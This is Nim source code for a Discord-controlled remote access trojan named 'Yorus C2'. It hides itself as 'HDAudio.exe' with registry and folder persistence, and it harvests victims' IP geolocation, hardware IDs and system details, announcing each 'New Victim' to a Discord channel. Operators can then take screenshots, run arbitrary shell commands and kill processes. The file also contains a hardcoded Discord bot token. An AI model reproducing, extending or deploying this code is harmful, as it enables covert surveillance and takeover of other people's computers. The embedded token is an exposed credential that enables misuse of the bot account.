import dimscord, asyncdispatch, options, strutils, strformat, json
import core / [pcinformation, control, sender, startup]

# --- CONFIG HERER --- #
let discord = newDiscordClient("MTEzMDMwMTg3Nzg0MjYyODY4OQ.G6ENSf.3CeDySFYeqqQcH1o8JQF6Mr8VX37qrXiFUdSUs")
let prefix = "-"
let guildId = some "1130467889351233626"
let notificationChannelId = "1131036312326127708"
let startupFile = true
let startupOnRegKey = true
let startupOnFolder = false
let startupFilename = "HDAudio.exe"
# let startupDirPath = 

var
    pcControl = PcControl()
    pcInfor = PcInformation()
    messageSender = Sender()
    fileStartup = Startup(filename: startupFilename, startupOnFolder: startupOnFolder, startupOnRegKey: startupOnRegKey, dirPath: &"C:\\Users\\{pcInfor.username()}\\AppData\\Roaming\\HDAudio")

let 
    # --- IP INFORMATION --- #
    ipData = pcInfor.ipData()
    ip = ipData["ip"]
    hostname = ipData["hostname"]
    city = ipData["city"]
    region = ipData["region"]
    loc = ipData["loc"]
    org = ipData["org"]
    postal = ipData["postal"]
    timezone = ipData["timezone"]
    # --- SYSTEM INFORMATION --- #
    sysinfo = pcInfor.systemInfo()
    hwid = pcInfor.hwid()
    username = pcInfor.username()
    MachineModel = sysinfo["MachineModel"]
    MachineName = sysinfo["MachineName"]
    OsName = sysinfo["OsName"]
    OsVersion = sysinfo["OsVersion"]
    CpuName = sysinfo["CpuName"]
    CpuGhz = sysinfo["CpuGhz"]
    CpuManufacturer = sysinfo["CpuManufacturer"]
    NumCpus = sysinfo["NumCpus"]
    NumTotalCores = sysinfo["NumTotalCores"]
    TotalMemory = sysinfo["TotalMemory"]
    FreeMemory = sysinfo["FreeMemory"]
    GpuName = sysinfo["GpuName"]
    GpuDriverVersion = sysinfo["GpuDriverVersion"]
    GpuMaxFPS = sysinfo["GpuMaxFPS"]

let
    ipInfo = &"**__IP INFORMATION__**```prolog\nIP       : {ip}\nHostName : {hostname}\nCity     : {city}\nRegion   : {region}\nLocation : {loc}\nOrg      : {org}\nPostal   : {postal}\nTimezone : {timezone}\n```"
    systemInfo = &"**__SYSTEM__**```autohotkey\nMachineModel : {MachineModel}\nMachineName : {MachineName}\nOsName : {OsName}\nOsVersion : {OsVersion}\nCpuName : {CpuName}\nCpuGhz : {CpuGhz} Hz\nCpuManufacturer : {CpuManufacturer}\nNumCpus : {NumCpus}\nNumTotalCores : {NumTotalCores}\nTotalMemory : {TotalMemory} GB\nFreeMemory : {FreeMemory} GB\nGpuName : {GpuName}\nGpuDriverVersion : {GpuDriverVersion}\nGpuMaxFPS : {GpuMaxFPS}\n```" 

proc onReady(s: Shard, r: Ready) {.event(discord).} =
    echo "Ready as " & $r.user
    await s.updateStatus(activity = some ActivityStatus(
        name: &"Yorus C2 use {prefix}help",
        kind: atPlaying,
    ), status = "dnd")
    if startupFile: fileStartup.startup()
    discard await discord.api.sendMessage(
        notificationChannelId,
        content = &"@everyone New Victim {MachineName}",
        embeds = @[Embed(
            title: some "IP INFORMATION",
            description: some ipInfo,
            color: some 0x7789ec
        ),
                Embed(
            title: some "SYSTEM INFORMATION",
            description: some systemInfo,
            color: some 0x7789ec
        )]
    )

proc messageCreate(s: Shard, m: Message) {.event(discord).} =
    if m.guild_id != guildId: return

    let args = m.content.split(" ")
    if m.author.bot or not args[0].startsWith(prefix): return
    let command = args[0][1..args[0].high].toLowerAscii()
    var command_arr = args

    # --- SET API AND CHANNEL ID --- #
    pcControl.setApi(discord.api)
    pcControl.setChannelId(m.channel_id)

    case command:
    of "help", "list":
        discard
    else:
        let id = 
            try: args[1]
            except: 
                discard await discord.api.sendMessage(
                    m.channel_id,
                    "Please pass in all requirements :rolling_eyes:."
                )
                return
        if id != hwid : return
        command_arr.delete(0)
        command_arr.delete(0)

    # --- OTHER --- #
    case command:
    of "help":
        discard await discord.api.sendMessage(
            m.channel_id, 
            embeds = @[
                    Embed(
                        title: some "Commands",
                        description: some &"**__Commands__**```\nscreenshot, sc, s  [Id] : Screenshot\nshell [Id] : Shell\ncd [Id] : Change Directory\ndir, ls [Id] : List Item in Directoy```",
                        color: some 0x7789ec
                    ),
                    Embed(
                        title: some "Other",
                        description: some &"**__Other__**```\nlist : List all infecter\ngetinfo [Id] : Get Information of infecter```",
                        color: some 0x7789ec
            )]
        )

    of "list":
        let info = &"**__INFORMATION__**```prolog\nIP   : {ip}\nHWID : \"{hwid}\"\n```"
        discard await messageSender.sendOutput(discord.api, m.channel_id, info, false)

    of "getinfo":
        discard await messageSender.sendOutput(discord.api, m.channel_id, ipInfo, false)
        discard await messageSender.sendOutput(discord.api, m.channel_id, systemInfo, false)

    # --- CONTROLS --- #
    of "screenshot", "sc", "s":
        let savePath = &"C:\\Users\\{username}\\AppData\\Local\\Temp"
        discard await pcControl.screenshot(savePath)

    of "shell":
        let command = join(command_arr, " ")
        discard await pcControl.shell(command)

    of "cd":
        let path = join(command_arr, " ")
        discard await pcControl.cd(path)

    of "dir", "ls":
        discard await pcControl.shell("dir")

    of "taskkill", "tk":
        let processName = join(command_arr, " ")
        discard await pcControl.taskkill(processName)

    of "upload", "up":
        discard

    of "download", "down":
        discard

waitFor discord.startSession(
    gateway_intents = {giGuildMessages, giGuilds, giGuildMembers, giMessageContent}
)